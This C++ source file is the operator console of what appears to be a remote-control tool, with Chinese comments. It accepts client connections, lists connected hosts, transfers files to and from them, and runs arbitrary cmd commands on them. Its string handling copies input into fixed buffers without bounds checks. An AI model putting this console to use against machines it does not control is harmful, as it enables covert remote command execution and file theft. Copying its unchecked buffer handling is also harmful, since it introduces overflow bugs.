#include "main.h"

/*
	主函数
*/
int main(int argc, char **argv)
{
	tcpSocket socket("192.168.1.3", 5809);     // 服务端开始监听并且等待客户端的连接
	if (!socket.tcpAccept())                 
		return false;

	commandReduce(&socket);                    // 开始命令行的解析
	return true;
}


/*
	解析命令行参数
*/
void commandReduce(tcpSocket *socket)
{
	string name;
	char commandLine[MAX_PATH] = { 0 }; char *separate;

	while (true)
	{
		cout << "input your command: ";
		getline(cin, name);
		if (strlen(name.data()) > MAX_PATH)
		{
			cout << " [!] Exceeded maximum length..." << endl;
			cout << "" << endl;
			continue;
		}
		ZeroMemory(commandLine, MAX_PATH);
		memcpy(commandLine, name.data(), strlen(name.data()));
		strcat(commandLine + strlen(commandLine), " ");

		separate = strchr(commandLine, '-');                                                                             // 寻找命令标识, 比如 -h -upload 等
		if (separate == NULL)
		{
			cout << " [!] Incorrect input..." << endl;
			cout << "" << endl;
			continue;
		}

		if (strncmp(separate, "-help ", 6) == 0 || strncmp(separate, "-h ", 3) == 0)								        // 命令行 -h
		{
			cout << "| -h / -help                                                                 显示帮助信息                   " << endl;
			cout << "| -c / -connect                                                              显示连接台数                   " << endl;
			cout << "| -s / -sendToClient [ownFilePath]  [clientFilePath] [socketNumber]          上传文件至远程客户端           " << endl;
			cout << "| -r / -recvToClient [ownFilePath]  [clientFilePath] [socketNumber]          从远程客户端下载文件           " << endl;
			cout << "| -x / -clientCmd    [socketNumber] [cmdChar]                                执行远程 cmd 命令              " << endl;
			cout << "| -q / -quit                                                                 退出                           " << endl;
			cout << "" << endl;
		}
		else if (strncmp(separate, "-clientCmd ", 11) == 0 || strncmp(separate, "-x ", 3) == 0)                          // 执行远程 cmd
		{
			char cmdChar[MAX_PATH] = { 0 }; char socketNumber[40] = { 0 };
			char s[2] = " "; char *token; int index = 0;

			token = strtok(separate, s);
			while (token != NULL) {
				index += 1;
				if (index == 2)                                               // 第一个参数
					memcpy(socketNumber, token, strlen(token));
				else if (index == 3)                                          // 第二个参数
					memcpy(cmdChar, token, strlen(token));
				else if (index > 10)
					break;
				else
				{
					strcat(cmdChar, " ");
					strcat(cmdChar, token);
				}
				token = strtok(NULL, s);
			}
			if (index < 10)
			{
				if (cmdExec(cmdChar, socketNumber, socket) == true)
				{
					cout << " [*] 执行命令成功" << endl;
				}
				else
				{
					cout << " [!] 执行命令失败" << endl;
				}
			}
			else
			{
				cout << " [!] Too few parameters..." << endl;
			}
			cout << "" << endl;
		}
		else if (strncmp(separate, "-recvToClient ", 14) == 0 || strncmp(separate, "-r ", 3) == 0)                          // 命令行 -u 上传
		{
			char ownFilePath[MAX_PATH] = { 0 }; char clientFilePath[MAX_PATH] = { 0 }; char socketNumber[40] = { 0 };
			char s[2] = " "; char *token; int index = 0;

			token = strtok(separate, s);
			while (token != NULL) {
				index += 1;
				if (index == 2)
					memcpy(ownFilePath, token, strlen(token));
				else if (index == 3)
					memcpy(clientFilePath, token, strlen(token));
				else if (index == 4)
					memcpy(socketNumber, token, strlen(token));
				else if (index > 4)
					break;
				token = strtok(NULL, s);
			}
			if (index == 4)
			{
				if (recvToClient(ownFilePath, clientFilePath, socketNumber, socket) == true)
				{
					cout << " [*] 传输文件成功" << endl;
				}
				else
				{
					cout << " [!] 传输文件失败" << endl;
				}
			}
			else
			{
				cout << " [!] Too few parameters..." << endl;
			}
			cout << "" << endl;
		}
		else if (strncmp(separate, "-sendToClient ", 14) == 0 || strncmp(separate, "-s ", 3) == 0)                        // 命令行 -d 下载
		{
			char ownFilePath[MAX_PATH] = { 0 }; char clientFilePath[MAX_PATH] = { 0 }; char socketNumber[40] = { 0 };
			char s[2] = " "; char *token; int index = 0;

			token = strtok(separate, s);
			while (token != NULL) {
				index += 1;
				if (index == 2)                                              
					memcpy(ownFilePath, token, strlen(token));
				else if (index == 3)                                   
					memcpy(clientFilePath, token, strlen(token));
				else if (index == 4)
					memcpy(socketNumber, token, strlen(token));
				else if (index > 4)
					break;
				token = strtok(NULL, s);
			}
			if (index == 4)
			{
				if (sendToClient(ownFilePath, clientFilePath, socketNumber, socket) == true)
				{
					cout << " [*] 传输文件成功" << endl;
				}
				else
				{
					cout << " [!] 传输文件失败" << endl;
				}
			}
			else
			{
				cout << " [!] Too few parameters..." << endl;
			}
			cout << "" << endl;
		}
		else if (strncmp(separate, "-connect ", 9) == 0 || strncmp(separate, "-c ", 3) == 0)                        // 命令行 -c 查看连接数
		{
			socket->threadToRefresh();
			tcpSocketPool *pool = connectionInfo(); int index = 0;
			cout << " | 连接的序号             IP 地址" << endl;
			for (int i = 0; i < 50; i++)
			{
				if (pool->isConnection == true)
				{
					cout << " | " << pool->sNumber << "                      " << pool->clientIp << endl;
					index += 1;
				}
				pool += 1;
			}
			if (index == 0)
				cout << "   无                     无" << endl;

			cout << "" << endl;
		}
		else if (strncmp(separate, "-quit ", 6) == 0 || strncmp(separate, "-q ", 3) == 0)                           // 命令行 -q 退出
		{
			cout << "" << endl;
			return;
		}
		else
		{
			cout << " [!] Incorrect input..." << endl;
			cout << "" << endl;
		}
	}
}





